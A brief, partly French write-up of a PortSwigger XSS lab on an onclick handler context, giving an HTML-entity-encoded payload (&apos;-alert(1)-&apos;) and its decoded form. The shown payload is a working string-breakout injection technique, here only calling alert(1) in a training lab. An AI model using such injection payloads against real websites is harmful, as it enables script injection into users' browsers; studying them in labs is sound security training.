# Lab

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

## Payload

```
https://foo?&apos;-alert(1)-&apos;
```

Qui est interpreté comme :

```
https://foo?';-alert(1)-';
```